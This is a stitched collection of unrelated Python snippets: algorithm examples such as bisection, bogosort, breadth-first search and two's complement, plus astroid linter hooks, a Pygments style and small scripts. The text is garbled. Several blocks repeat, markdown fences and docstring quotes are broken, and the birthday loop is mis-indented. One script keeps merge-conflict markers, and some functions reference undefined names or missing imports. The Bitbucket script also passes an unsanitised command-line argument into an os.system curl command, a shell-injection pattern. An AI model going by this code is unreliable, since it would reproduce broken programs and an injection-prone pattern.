        raise ValueError("Empty string was passed to the function")
    oct_string = ""
    while len(bin_string) % 3 != 0:
        bin_string = "0" + bin_string
    bin_string_in_3_list = [
        bin_string[index : index + 3]
        for index in range(len(bin_string))
        if index % 3 == 0
    ]
    for bin_group in bin_string_in_3_list:
        oct_val = 0
        for index, val in enumerate(bin_group):
            oct_val += int(2 ** (2 - index) * int(val))
        oct_string += str(oct_val)
    return oct_string


if __name__ == "__main__":
    from doctest import testmod

    testmod()

def binary_tree_paths(root):
    res = []
    if root is None:
        return res
    dfs(res, root, str(root.val))
    return res


def dfs(res, root, cur):
    if root.left is None and root.right is None:
        res.append(cur)
    if root.left:
        dfs(res, root.left, cur + "->" + str(root.left.val))
    if root.right:
        dfs(res, root.right, cur + "->" + str(root.right.val))

# Information on 2's complement: https://en.wikipedia.org/wiki/Two%27s_complement


def twos_complement(number: int) -> str:
    """
    Take in a negative integer 'number'.
    Return the two's complement representation of 'number'.

    >>> twos_complement(0)
    '0b0'
    >>> twos_complement(-1)
    '0b11'
    >>> twos_complement(-5)
    '0b1011'
    >>> twos_complement(-17)
    '0b101111'
    >>> twos_complement(-207)
    '0b100110001'
    >>> twos_complement(1)
    Traceback (most recent call last):
        ...
    ValueError: input must be a negative integer
    """
    if number > 0:
        raise ValueError("input must be a negative integer")
    binary_number_length = len(bin(number)[3:])
    twos_complement_number = bin(abs(number) - (1 << binary_number_length))[3:]
    twos_complement_number = (
        (
            "1"
            + "0" * (binary_number_length - len(twos_complement_number))
            + twos_complement_number
        )
        if number < 0
        else "0"
    )
    return "0b" + twos_complement_number


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
Helper methods for binary package
Author: Ian Doarn```


```py


def pad(value, return_type=str):
    """
        Pad binary value with zeros
        :param value: string
        :param return_type: string
    """
    if type(value) is not str:
        raise TypeError("pad only accepts str, not {}".format(str(type(value))))
    if len(value) % 4 != 0:
        pad_amount = 4 - (len(value) % 4)
        return return_type(("0" * pad_amount) + value)
    else:
        return return_type(value)


def to_string(binary_array, delimiter=" "):
    """
        Convert binary array to string
    """
    if type(binary_array) is not list:
        raise TypeError("to_string only accepts lists, not {}".format(str(type(value))))
    return delimiter.join(binary_array)

# https://www.tutorialspoint.com/python3/bitwise_operators_example.htm


def binary_xor(a: int, b: int) -> str:
    """
    Take in 2 integers, convert them to binary,
    return a binary number that is the
    result of a binary xor operation on the integers provided.

    >>> binary_xor(25, 32)
    '0b111001'
    >>> binary_xor(37, 50)
    '0b010111'
    >>> binary_xor(21, 30)
    '0b01011'
    >>> binary_xor(58, 73)
    '0b1110011'
    >>> binary_xor(0, 255)
    '0b11111111'
    >>> binary_xor(256, 256)
    '0b000000000'
    >>> binary_xor(0, -1)
    Traceback (most recent call last):
        ...
    ValueError: the value of both input must be positive
    >>> binary_xor(0, 1.1)
    Traceback (most recent call last):
        ...
    TypeError: 'float' object cannot be interpreted as an integer
    >>> binary_xor("0", "1")
    Traceback (most recent call last):
        ...
    TypeError: '<' not supported between instances of 'str' and 'int'
    """
    if a < 0 or b < 0:
        raise ValueError("the value of both input must be positive")

    a_binary = str(bin(a))[2:]  # remove the leading "0b"
    b_binary = str(bin(b))[2:]  # remove the leading "0b"

    max_len = max(len(a_binary), len(b_binary))

    return "0b" + "".join(
        str(int(char_a != char_b))
        for char_a, char_b in zip(a_binary.zfill(max_len), b_binary.zfill(max_len))
    )


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# patch-1
import os  # The OS module in python provides functions for interacting with the operating system

# patch-3
# function to check if 'binod' is present in the file.
# def checkBinod(file):
# =======

# def checkBinod(file):       #this function will check there is any 'Binod' text in file or not
#     with open(file, "r") as f: #we are opening file in read mode and using 'with' so need to take care of close()
# =======
import time
import os

# Importing our Bindoer
print("To Kaise Hai Ap Log!")
time.sleep(1)
print("Chaliye Binod Karte Hai!")


def checkBinod(file):  # Trying to find Binod In File Insted Of Manohar Ka Kotha
    # master
    with open(file, "r") as f:
        # master
        fileContent = f.read()
    if "binod" in fileContent.lower():
        print(f"**************Congratulations Binod found in {f}********************")
        return True
    else:
        return False


if __name__ == "__main__":
    print("************binod Detector********************")
    dir_contents = os.listdir()
    for item in dir_contents:
        if item.endswith("txt"):
            ans = checkBinod(item)
            if ans is False:
                print("Binod not found Try Looking In Manohar Ka Kotha!!")

def binomial_coefficient(n, r):
    """
    Find binomial coefficient using pascals triangle.

    >>> binomial_coefficient(10, 5)
    252
    """
    C = [0 for i in range(r + 1)]
    # nc0 = 1
    C[0] = 1
    for i in range(1, n + 1):
        # to compute current row from previous row.
        j = min(i, r)
        while j > 0:
            C[j] += C[j - 1]
            j -= 1
    return C[r]


print(binomial_coefficient(n=10, r=5))
````

````py
ID: 916cdf1e-c509-4dfe-bdee-fef5ad30798a
Python Algorithms, Page 78```


```py
from collections.abc import Sequence


def bipartite_matching_single(graph: Sequence[int]) -> list[int]:
    matches = list(graph)
    in_degrees = [0] * len(
        graph
    )  # This is an alternate to collections.Counter when the keys are 0-n.
    for target in graph:
        in_degrees[target] += 1
    zero_in_degrees = [
        node for node, in_degree in enumerate(in_degrees) if not in_degree
    ]
    while zero_in_degrees:
        node = zero_in_degrees.pop()
        target = matches[node]
        matches[node] = node
        in_degrees[target] -= 1
        if not in_degrees[target]:
            zero_in_degrees.append(target)
    return matches
````

````py
ID: 916cdf1e-c509-4dfe-bdee-fef5ad30798a
Python Algorithms, Page 78```


```py
from collections.abc import Sequence


def bipartite_matching_single(graph: Sequence[int]) -> list[int]:
    matches = list(graph)
    in_degrees = [0] * len(
        graph
    )  # This is an alternate to collections.Counter when the keys are 0-n.
    for target in graph:
        in_degrees[target] += 1
    zero_in_degrees = [
        node for node, in_degree in enumerate(in_degrees) if not in_degree
    ]
    while zero_in_degrees:
        node = zero_in_degrees.pop()
        target = matches[node]
        matches[node] = node
        in_degrees[target] -= 1
        if not in_degrees[target]:
            zero_in_degrees.append(target)
    return matches
````

````py
ID: 916cdf1e-c509-4dfe-bdee-fef5ad30798a
Python Algorithms, Page 78```


```py
from collections.abc import Sequence


def bipartite_matching_single(graph: Sequence[int]) -> list[int]:
    matches = list(graph)
    in_degrees = [0] * len(
        graph
    )  # This is an alternate to collections.Counter when the keys are 0-n.
    for target in graph:
        in_degrees[target] += 1
    zero_in_degrees = [
        node for node, in_degree in enumerate(in_degrees) if not in_degree
    ]
    while zero_in_degrees:
        node = zero_in_degrees.pop()
        target = matches[node]
        matches[node] = node
        in_degrees[target] -= 1
        if not in_degrees[target]:
            zero_in_degrees.append(target)
    return matches

birthdays = {'Alice': 'Apr 1', 'Bob': 'Dec 12', 'Carol': 'Mar 4'}
while True:
   print('Enter a name: (blank to quit)')
 name = input()
 if name == '':
   break
 if name in birthdays:
   print(birthdays[name] + ' is the birthday of ' + name)
 else:
   print('I do not have birthday information for ' + name)
 print('What is their birthday?')
 bday = input()
 birthdays[name] = bday
 print('Birthday database updated.')

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyExampe use of the bisect module.```


```py
# end_pymotw_header
import bisect

# A series of random numbers
values = [14, 85, 77, 26, 50, 45, 66, 79, 10, 3, 84, 77, 1]

print("New  Pos  Contents")
print("---  ---  --------")

l = []
for i in values:
    position = bisect.bisect(l, i)
    bisect.insort(l, i)
    print("{:3}  {:3}".format(i, position), l)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyExample of using bisect_left```


```py
# end_pymotw_header
import bisect

# A series of random numbers
values = [14, 85, 77, 26, 50, 45, 66, 79, 10, 3, 84, 77, 1]

print("New  Pos  Contents")
print("---  ---  --------")

# Use bisect_left and insort_left.
l = []
for i in values:
    position = bisect.bisect_left(l, i)
    bisect.insort_left(l, i)
    print("{:3}  {:3}".format(i, position), l)
````

````py
ID: d5c1e52d-602a-4c27-a39f-2b53caff987d
Grokking Algorithms, Page 3
https://leetcode.com/discuss/general-discussion/786126/Python-Powerful-Ultimate-Binary-Search-Template.-Solved-many-problems```


```py
from collections.abc import Callable


def bisect_search(predicate: Callable[[int], bool], low: int, high: int) -> int:
    """Find the lowest int between low and high where predicate(int) is True."""
    while low < high:
        mid = (
            low + (high - low) // 2
        )  # Avoids integer overflow compared to mid = (low + high) // 2
        if predicate(mid):
            high = mid
        else:
            low = mid + 1
    return low
````

````py
ID: d5c1e52d-602a-4c27-a39f-2b53caff987d
Grokking Algorithms, Page 3
https://leetcode.com/discuss/general-discussion/786126/Python-Powerful-Ultimate-Binary-Search-Template.-Solved-many-problems```


```py
from collections.abc import Callable


def bisect_search(predicate: Callable[[int], bool], low: int, high: int) -> int:
    """Find the lowest int between low and high where predicate(int) is True."""
    while low < high:
        mid = (
            low + (high - low) // 2
        )  # Avoids integer overflow compared to mid = (low + high) // 2
        if predicate(mid):
            high = mid
        else:
            low = mid + 1
    return low

import math


def bisection(
    function, a, b
):  # finds where the function becomes 0 in [a,b] using bolzano

    start = a
    end = b
    if function(a) == 0:  # one of the a or b is a root for the function
        return a
    elif function(b) == 0:
        return b
    elif (
        function(a) * function(b) > 0
    ):  # if none of these are root and they are both positive or negative,
        # then his algorithm can't find the root
        print("couldn't find root in [a,b]")
        return
    else:
        mid = (start + end) / 2
        while abs(start - mid) > 0.0000001:  # until we achieve precise equals to 10^-7
            if function(mid) == 0:
                return mid
            elif function(mid) * function(start) < 0:
                end = mid
            else:
                start = mid
            mid = (start + end) / 2
        return mid


def f(x):
    return math.pow(x, 3) - 2 * x - 5


print(bisection(f, 1, 1000))

def bishopAndPawn(bishop, pawn):
    x = "abcdefgh"
    return abs(int(x.index(bishop[0])) - int(x.index(pawn[0]))) == abs(
        int(bishop[1]) - int(pawn[1])
    )

#!/usr/bin/env python
# -*- coding: utf-8; mode: python -*-```


```py
A minimalist script to print the (ordered) list of Bitbucket repositories for a user :

$ bitbucket_repolist.py pseudo
git_repo1
...
git_repoK

- Date: 29-11-2013.
- Author: Lilian Besson, (C) 2016.
- Online: https://bitbucket.org/lbesson/bin/
- Licence: MIT Licence (http://lbesson.mit-license.org).```


```py

from __future__ import print_function  # Python 2/3 compatibility !
from json import load
from os import system
from sys import argv

# Read the pseudo from the command line, or use mine.
pseudo = argv[1] if len(argv) > 1 else "lbesson"
jsonfile = "bitbucket_{}.json".format(pseudo)
system("curl --silent https://bitbucket.org/api/1.0/users/" + pseudo + " > " + jsonfile)

b = load(open(jsonfile, "r"))

# for i in b['repositories']:
#     print(i['slug'])
list_of_repo = sorted([i["slug"] for i in b["repositories"]])
for i in list_of_repo:
    print(i)

def bitonic_sort(arr, reverse=False):
    """
    bitonic sort is sorting algorithm to use multiple process, but this code not containing parallel process
    It can sort only array that sizes power of 2
    It can sort array in both increasing order and decreasing order by giving argument true(increasing) and false(decreasing)

    Worst-case in parallel: O(log(n)^2)
    Worst-case in non-parallel: O(nlog(n)^2)

    reference: https://en.wikipedia.org/wiki/Bitonic_sorter
    """

    def compare(arr, reverse):
        n = len(arr) // 2
        for i in range(n):
            if reverse != (arr[i] > arr[i + n]):
                arr[i], arr[i + n] = arr[i + n], arr[i]
        return arr

    def bitonic_merge(arr, reverse):
        n = len(arr)

        if n <= 1:
            return arr

        arr = compare(arr, reverse)
        left = bitonic_merge(arr[: n // 2], reverse)
        right = bitonic_merge(arr[n // 2 :], reverse)
        return left + right

    # end of function(compare and bitionic_merge) definition
    n = len(arr)
    if n <= 1:
        return arr
    # checks if n is power of two
    if not (n and (not (n & (n - 1)))):
        raise ValueError("the size of input should be power of two")

    left = bitonic_sort(arr[: n // 2], True)
    right = bitonic_sort(arr[n // 2 :], False)

    arr = bitonic_merge(left + right, reverse)

    return arr

import numpy as np

i8 = np.int64()
i4 = np.int32()
u8 = np.uint64()
b_ = np.bool_()
i = int()

f8 = np.float64()

b_ >> f8  # E: No overload variant
i8 << f8  # E: No overload variant
i | f8  # E: Unsupported operand types
i8 ^ f8  # E: No overload variant
u8 & f8  # E: No overload variant
~f8  # E: Unsupported operand type

# mypys' error message for `NoReturn` is unfortunately pretty bad
# TODO: Reenable this once we add support for numerical precision for `number`s
# a = u8 | 0  # E: Need type annotation

def checkBlanagrams(word1, word2):

    lenWord1 = len(word1)
    lenWord2 = len(word2)
    # To store the frequencies of characters
    # of string word1 and word2
    freq1 = [0] * 26
    freq2 = [0] * 26

    # To store the count of valid pairs
    count = 0

    # Update the frequencies of the characters of string word1
    for i in range(lenWord1):
        freq1[ord(word1[i]) - ord("a")] += 1

    # update the frequencies of   the characters of string word2
    for i in range(lenWord2):
        freq2[ord(word2[i]) - ord("a")] += 1

    # Find the count of valid pairs
    for i in range(26):
        count += min(freq1[i], freq2[i])

    return count == lenWord1 - 1 == lenWord2 - 1


# Driver code
if __name__ == "__main__":

    print(checkBlanagrams("tangram", "anagram"))

import pygame
import random

from pygame.math import Vector2
from pygame import Rect


class Block:
    """
    Base class for square or rectangular object
    """

    def __init__(self, bounds, position, width, height, color):
        # Create a rectangle centered around the x and y
        self.bounds = bounds
        self.position = position
        self.rectangle = self.set_rectangle(position, width, height)
        self.color = color

    def update(self):
        # TODO:  Add base functionality
        pass

    def set_rectangle(self, position, width, height):
        # Creates a rectangle of the given width and height centered at the x/y coordinates
        return pygame.Rect(
            position.x - (width / 2), position.y - (height / 2), width, height
        )

    def draw(self, screen, pygame):
        pygame.draw.rect(screen, self.color, self.rectangle)

import requests
from bs4 import BeautifulSoup
from csv import writer

response = requests.get("http://codedemos.com/sampleblog/")

soup = BeautifulSoup(response.text, "html.parser")

posts = soup.find_all(class_="post-preview")

with open("posts.csv", "w") as csv_file:
    csv_writer = writer(csv_file)
    headers = ["Title", "Link", "Date"]
    csv_writer.writerow(headers)

    for post in posts:
        title = post.find(class_="post-title").get_text().replace("\n", "")
        link = post.find("a")["href"]
        date = post.select(".post-date")[0].get_text()
        csv_writer.writerow([title, link, date])

#!/usr/bin/python
# -*- coding: utf-8 -*-


import sys

# BMI calculator
# f(w, h) = w / h ** 2
# w refers to weight, h refers to height
# weight is in kilograms(kg's), height in meters(m) standard metrics

body_mass_index = lambda w, h: round((w) / ((h * 0.01) ** 2), 1)

# Test
# Playing/Testing Interface
i = 0
while True:
    if (
        raw_input("\n[{}] Exit(press e) or To count BMI(press c):".format(i))
        .strip()
        .lower()
        == "c"
    ):
        cal = body_mass_index(
            float(raw_input("\nWeight(in kgs)?: ")),
            float(raw_input("Height (in cm)?: ")),
        )

        print("\nHealthy BMI ranges between 19 to 25:")
        print("Status: ")
        if cal >= 19 and cal <= 25:
            print("Your BMI: " + str(cal) + "\n  You are HEALTHY")
        elif cal < 19:
            print(
                "Your BMI: "
                + str(cal)
                + "\n  Your BodyMassIndex is Underweight\n  Not between Healthy range"
            )
        else:
            print(
                "Your BMI: "
                + str(cal)
                + "\n  Your BodyMassIndex is Overweight\n  Not between Healthy range"
            )
        i += 1

    else:
        sys.exit()

import random


def bogo_sort(arr, simulation=False):
    """Bogo Sort
        Best Case Complexity: O(n)
        Worst Case Complexity: O(∞)
        Average Case Complexity: O(n(n-1)!)
    """

    iteration = 0
    if simulation:
        print("iteration", iteration, ":", *arr)

    def is_sorted(arr):
        # check the array is inorder
        i = 0
        arr_len = len(arr)
        while i + 1 < arr_len:
            if arr[i] > arr[i + 1]:
                return False
            i += 1

        return True

    while not is_sorted(arr):
        random.shuffle(arr)

        if simulation:
            iteration = iteration + 1
            print("iteration", iteration, ":", *arr)

    return arr
````

````py
This is a pure python implementation of the bogosort algorithm
For doctests run following command:
python -m doctest -v bogosort.py
or
python3 -m doctest -v bogosort.py
For manual testing run:
python bogosort.py```


```py

from __future__ import print_function
import random


def bogosort(collection):
    """Pure implementation of the bogosort algorithm in Python
    :param collection: some mutable ordered collection with heterogeneous
    comparable items inside
    :return: the same collection ordered by ascending
    Examples:
    >>> bogosort([0, 5, 3, 2, 2])
    [0, 2, 2, 3, 5]
    >>> bogosort([])
    []
    >>> bogosort([-2, -5, -45])
    [-45, -5, -2]
    """

    def isSorted(collection):
        if len(collection) < 2:
            return True
        for i in range(len(collection) - 1):
            if collection[i] > collection[i + 1]:
                return False
        return True

    while not isSorted(collection):
        random.shuffle(collection)
    return collection


if __name__ == "__main__":
    try:
        raw_input  # Python 2
    except NameError:
        raw_input = input  # Python 3

    user_input = raw_input("Enter numbers separated by a comma:\n").strip()
    unsorted = [int(item) for item in user_input.split(",")]
    print(bogosort(unsorted))
````

````py
    pygments.styles.borland
    ~~~~~~~~~~~~~~~~~~~~~~~

    Style similar to the style used in the Borland IDEs.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import (
    Keyword,
    Name,
    Comment,
    String,
    Error,
    Number,
    Operator,
    Generic,
    Whitespace,
)


class BorlandStyle(Style):
    """
    Style similar to the style used in the borland IDEs.
    """

    default_style = ""

    styles = {
        Whitespace: "#bbbbbb",
        Comment: "italic #008800",
        Comment.Preproc: "noitalic #008080",
        Comment.Special: "noitalic bold",
        String: "#0000FF",
        String.Char: "#800080",
        Number: "#0000FF",
        Keyword: "bold #000080",
        Operator.Word: "bold",
        Name.Tag: "bold #000080",
        Name.Attribute: "#FF0000",
        Generic.Heading: "#999999",
        Generic.Subheading: "#aaaaaa",
        Generic.Deleted: "bg:#ffdddd #000000",
        Generic.Inserted: "bg:#ddffdd #000000",
        Generic.Error: "#aa0000",
        Generic.Emph: "italic",
        Generic.Strong: "bold",
        Generic.Prompt: "#555555",
        Generic.Output: "#888888",
        Generic.Traceback: "#aa0000",
        Error: "bg:#e3d2d2 #a61717",
    }

def boxBlur(image):

    m = len(image) - 2
    n = len(image[0]) - 2
    blur_img = [[0] * n for _ in range(m)]

    for i in range(1, m + 1):
        for j in range(1, n + 1):

            indexes = [
                [i - 1, j - 1],
                [i - 1, j],
                [i - 1, j + 1],
                [i, j - 1],
                [i, j],
                [i, j + 1],
                [i + 1, j - 1],
                [i + 1, j],
                [i + 1, j + 1],
            ]

            avg = int(math.floor(sum([image[k][l] for (k, l) in indexes]) / 9))
            blur_img[i - 1][j - 1] = avg

    return blur_img

from astroid import arguments, inference_tip, nodes
from astroid.exceptions import UseInferenceDefault
from astroid.manager import AstroidManager


def infer_namespace(node, context=None):
    callsite = arguments.CallSite.from_call(node, context=context)
    if not callsite.keyword_arguments:
        # Cannot make sense of it.
        raise UseInferenceDefault()

    class_node = nodes.ClassDef("Namespace", "docstring")
    class_node.parent = node.parent
    for attr in set(callsite.keyword_arguments):
        fake_node = nodes.EmptyNode()
        fake_node.parent = class_node
        fake_node.attrname = attr
        class_node.instance_attrs[attr] = [fake_node]
    return iter((class_node.instantiate_class(),))


def _looks_like_namespace(node):
    func = node.func
    if isinstance(func, nodes.Attribute):
        return (
            func.attrname == "Namespace"
            and isinstance(func.expr, nodes.Name)
            and func.expr.name == "argparse"
        )
    return False


AstroidManager().register_transform(
    nodes.Call, inference_tip(infer_namespace), _looks_like_namespace
)

# Licensed under the LGPL: https://www.gnu.org/licenses/old-licenses/lgpl-2.1.en.html
# For details: https://github.com/PyCQA/astroid/blob/main/LICENSE
````

```pyAstroid hooks for understanding boto3.ServiceRequest()"""
from astroid import extract_node
from astroid.manager import AstroidManager
from astroid.scoped_nodes import ClassDef

BOTO_SERVICE_FACTORY_QUALIFIED_NAME = "boto3.resources.base.ServiceResource"


def service_request_transform(node):
    """Transform ServiceResource to look like dynamic classes"""
    code = """
    def __getattr__(self, attr):
        return 0
    """
    func_getattr = extract_node(code)
    node.locals["__getattr__"] = [func_getattr]
    return node


def _looks_like_boto3_service_request(node):
    return node.qname() == BOTO_SERVICE_FACTORY_QUALIFIED_NAME


AstroidManager().register_transform(
    ClassDef, service_request_transform, _looks_like_boto3_service_request
)

# Licensed under the LGPL: https://www.gnu.org/licenses/old-licenses/lgpl-2.1.en.html
# For details: https://github.com/PyCQA/astroid/blob/main/LICENSE
from astroid.brain.helpers import register_module_extender
from astroid.builder import parse
from astroid.const import PY37_PLUS
from astroid.manager import AstroidManager

if PY37_PLUS:
    # Since Python 3.7 Hashing Methods are added
    # dynamically to globals()

    def _re_transform():
        return parse(
            """
        from collections import namedtuple
        _Method = namedtuple('_Method', 'name ident salt_chars total_size')

        METHOD_SHA512 = _Method('SHA512', '6', 16, 106)
        METHOD_SHA256 = _Method('SHA256', '5', 16, 63)
        METHOD_BLOWFISH = _Method('BLOWFISH', 2, 'b', 22)
        METHOD_MD5 = _Method('MD5', '1', 8, 34)
        METHOD_CRYPT = _Method('CRYPT', None, 2, 13)
        """
        )

    register_module_extender(AstroidManager(), "crypt", _re_transform)

# Copyright (c) 2015-2016, 2018, 2020 Claudiu Popa <pcmanticore@gmail.com>
# Copyright (c) 2015 raylu <lurayl@gmail.com>
# Copyright (c) 2016 Ceridwen <ceridwenv@gmail.com>
# Copyright (c) 2020-2021 hippo91 <guillaume.peillex@gmail.com>
# Copyright (c) 2021 Pierre Sassoulas <pierre.sassoulas@gmail.com>
# Copyright (c) 2021 Marc Mueller <30130371+cdce8p@users.noreply.github.com>

# Licensed under the LGPL: https://www.gnu.org/licenses/old-licenses/lgpl-2.1.en.html
# For details: https://github.com/PyCQA/astroid/blob/main/LICENSE
```

```pyAstroid hooks for dateutil"""

import textwrap

from astroid.brain.helpers import register_module_extender
from astroid.builder import AstroidBuilder
from astroid.manager import AstroidManager


def dateutil_transform():
    return AstroidBuilder(AstroidManager()).string_build(
        textwrap.dedent(
            """
    import datetime
    def parse(timestr, parserinfo=None, **kwargs):
        return datetime.datetime()
    """
        )
    )


register_module_extender(AstroidManager(), "dateutil.parser", dateutil_transform)

# Copyright (c) 2019-2021 hippo91 <guillaume.peillex@gmail.com>
# Copyright (c) 2020 Claudiu Popa <pcmanticore@gmail.com>
# Copyright (c) 2021 Pierre Sassoulas <pierre.sassoulas@gmail.com>
# Copyright (c) 2021 Marc Mueller <30130371+cdce8p@users.noreply.github.com>

# Licensed under the LGPL: https://www.gnu.org/licenses/old-licenses/lgpl-2.1.en.html
# For details: https://github.com/PyCQA/astroid/blob/main/LICENSE

```

```pyAstroid hooks for numpy.core.fromnumeric module."""
from astroid.brain.helpers import register_module_extender
from astroid.builder import parse
from astroid.manager import AstroidManager


def numpy_core_fromnumeric_transform():
    return parse(
        """
    def sum(a, axis=None, dtype=None, out=None, keepdims=None, initial=None):
        return numpy.ndarray([0, 0])
    """
    )


register_module_extender(
    AstroidManager(), "numpy.core.fromnumeric", numpy_core_fromnumeric_transform
)

from astroid.brain.helpers import register_module_extender
from astroid.builder import parse
from astroid.manager import AstroidManager


def _session_transform():
    return parse(
        """
    from sqlalchemy.orm.session import Session

    class sessionmaker:
        def __init__(
            self,
            bind=None,
            class_=Session,
            autoflush=True,
            autocommit=False,
            expire_on_commit=True,
            info=None,
            **kw
        ):
            return

        def __call__(self, **local_kw):
            return Session()

        def configure(self, **new_kw):
            return

        return Session()
    """
    )


register_module_extender(AstroidManager(), "sqlalchemy.orm.session", _session_transform)

# Copyright (c) 2016, 2018-2020 Claudiu Popa <pcmanticore@gmail.com>
# Copyright (c) 2017 Łukasz Rogalski <rogalski.91@gmail.com>
# Copyright (c) 2020-2021 hippo91 <guillaume.peillex@gmail.com>
# Copyright (c) 2021 Pierre Sassoulas <pierre.sassoulas@gmail.com>
# Copyright (c) 2021 Marc Mueller <30130371+cdce8p@users.noreply.github.com>

# Licensed under the LGPL: https://www.gnu.org/licenses/old-licenses/lgpl-2.1.en.html
# For details: https://github.com/PyCQA/astroid/blob/main/LICENSE

from astroid.brain.helpers import register_module_extender
from astroid.builder import parse
from astroid.manager import AstroidManager


def _thread_transform():
    return parse(
        """
    class lock(object):
        def acquire(self, blocking=True, timeout=-1):
            return False
        def release(self):
            pass
        def __enter__(self):
            return True
        def __exit__(self, *args):
            pass
        def locked(self):
            return False

    def Lock():
        return lock()
    """
    )


register_module_extender(AstroidManager(), "threading", _thread_transform)

# Copyright (c) 2017-2018, 2020 Claudiu Popa <pcmanticore@gmail.com>
# Copyright (c) 2020-2021 hippo91 <guillaume.peillex@gmail.com>
# Copyright (c) 2021 Pierre Sassoulas <pierre.sassoulas@gmail.com>
# Copyright (c) 2021 Marc Mueller <30130371+cdce8p@users.noreply.github.com>

# Licensed under the LGPL: https://www.gnu.org/licenses/old-licenses/lgpl-2.1.en.html
# For details: https://github.com/PyCQA/astroid/blob/main/LICENSE
```

```pyAstroid hooks for the UUID module."""
from astroid.manager import AstroidManager
from astroid.node_classes import Const
from astroid.scoped_nodes import ClassDef


def _patch_uuid_class(node):
    # The .int member is patched using __dict__
    node.locals["int"] = [Const(0, parent=node)]


AstroidManager().register_transform(
    ClassDef, _patch_uuid_class, lambda node: node.qname() == "uuid.UUID"
)
```

````py
Author: OMKAR PATHAK
Created On: 1st August 2017```


```py
import inspect


def search(graph, start_vertex):
    """
    Breadth first search algorithm

    :param graph:
    :param start_vertex:
    :return:
    """

    # Take a list for storing already visited vertexes
    if (
        start_vertex not in graph
        or graph[start_vertex] is None
        or graph[start_vertex] == []
    ):
        return None

    # create a list to store all the vertexes for BFS and a set to store the visited vertices
    visited, queue = set(), [start_vertex]

    while queue:
        vertex = queue.pop(0)
        if vertex not in visited:
            visited.add(vertex)
            queue.extend(graph[vertex] - visited)
    return visited


# TODO: Are these necessary?
def time_complexities():
    """
    Return information on functions
    time complexity
    :return: string
    """
    return "O(V + E) where V = Number of vertices and E = Number of Edges"


def get_code():
    """
    easily retrieve the source code
    of the function

    :return: source code
    """
    return inspect.getsource(search)
````

````py
https://en.wikipedia.org/wiki/Breadth-first_search
pseudo-code:
breadth_first_search(graph G, start vertex s):
// all nodes initially unexplored
mark s as explored
let Q = queue data structure, initialized with s
while Q is non-empty:
    remove the first node of Q, call it v
    for each edge(v, w):  // for w in graph[v]
        if w unexplored:
            mark w as explored
            add w to Q (at the end)```


```py
from __future__ import annotations

G = {
    "A": ["B", "C"],
    "B": ["A", "D", "E"],
    "C": ["A", "F"],
    "D": ["B"],
    "E": ["B", "F"],
    "F": ["C", "E"],
}


def breadth_first_search(graph: dict, start: str) -> set[str]:
    """
    >>> ''.join(sorted(breadth_first_search(G, 'A')))
    'ABCDEF'
    """
    explored = {start}
    queue = [start]
    while queue:
        v = queue.pop(0)  # queue.popleft()
        for w in graph[v]:
            if w not in explored:
                explored.add(w)
                queue.append(w)
    return explored


if __name__ == "__main__":
    print(breadth_first_search(G, "A"))

# Python Program to implement
# Odd-Even / Brick Sort


def oddEvenSort(arr, n):
    # Initially array is unsorted
    isSorted = 0
    while isSorted == 0:
        isSorted = 1
        temp = 0
        for i in range(1, n - 1, 2):
            if arr[i] > arr[i + 1]:
                arr[i], arr[i + 1] = arr[i + 1], arr[i]
                isSorted = 0

        for i in range(0, n - 1, 2):
            if arr[i] > arr[i + 1]:
                arr[i], arr[i + 1] = arr[i + 1], arr[i]
                isSorted = 0

    return


arr = [34, 2, 10, -9]
n = len(arr)

oddEvenSort(arr, n)
for i in range(0, n):
    print(arr[i], end=" ")

def brick_sort(arr):
    """Performs an odd-even in-place sort, which is a variation of a bubble
    sort.

    https://www.geeksforgeeks.org/odd-even-sort-brick-sort/

    :param arr: the array of values to sort
    :return: the sorted array
    """
    # Initially array is unsorted
    is_sorted = False
    while not is_sorted:
        is_sorted = True

        for i in range(1, len(arr) - 1, 2):
            if arr[i] > arr[i + 1]:
                arr[i], arr[i + 1] = arr[i + 1], arr[i]
                is_sorted = False

        for i in range(0, len(arr) - 1, 2):
            if arr[i] > arr[i + 1]:
                arr[i], arr[i + 1] = arr[i + 1], arr[i]
                is_sorted = False

    return arr

import psutil
from obs import watcher

browsers = ["chrome.exe", "firefox.exe", "edge.exe", "iexplore.exe"]

# ADD DOWNLOADS PATH HERE::: r is for raw string enter the path
# Example: path_to_watch=r"C:\Users\Xyz\Downloads"
# find downloads path .


path_to_watch = r" "


for browser in browsers:
    while browser in (process.name() for process in psutil.process_iter()):
        watcher(path_to_watch)

# Given a non-empty binary search tree and a target value,
# find the value in the BST that is closest to the target.

# Note:
# Given target value is a floating point.
# You are guaranteed to have only one unique value in the BST
# that is closest to the target.


# Definition for a binary tree node.
# class TreeNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


def closest_value(root, target):
    """
    :type root: TreeNode
    :type target: float
    :rtype: int
    """
    a = root.val
    kid = root.left if target < a else root.right
    if not kid:
        return a
    b = closest_value(kid, target)
    return min((a, b), key=lambda x: abs(target - x))
````

````py
ID: 4d4a5521-ebd2-4f8c-95a3-ef67db3aeecf
https://leetcode.com/problems/balance-a-binary-search-tree/```


```py
from collections.abc import Sequence
from typing import Optional

from src.typehints import BTNode


def bst_make_balanced_recur(values: Sequence[int]) -> Optional[BTNode]:
    """Make a balanced binary search tree from a sorted sequence of values."""
    if not values:
        return None
    mid = len(values) // 2
    root = BTNode(values[mid])
    root.left = bst_make_balanced_recur(values[:mid])
    root.right = bst_make_balanced_recur(values[mid + 1 :])
    return root
````

````py
ID: 4d4a5521-ebd2-4f8c-95a3-ef67db3aeecf
https://leetcode.com/problems/balance-a-binary-search-tree/```


```py
from collections.abc import Sequence
from typing import Optional

from src.typehints import BTNode


def bst_make_balanced_recur(values: Sequence[int]) -> Optional[BTNode]:
    """Make a balanced binary search tree from a sorted sequence of values."""
    if not values:
        return None
    mid = len(values) // 2
    root = BTNode(values[mid])
    root.left = bst_make_balanced_recur(values[:mid])
    root.right = bst_make_balanced_recur(values[mid + 1 :])
    return root
````

````py
ID: b9cd1e0a-a238-44a7-8116-8ae959d38f29
https://leetcode.com/problems/binary-tree-inorder-traversal/```


```py
from collections.abc import Iterable
from typing import Optional

from src.typehints import BTNode


def bt_inorder_traversal_recur(root: Optional[BTNode]) -> Iterable[BTNode]:
    if root is not None:
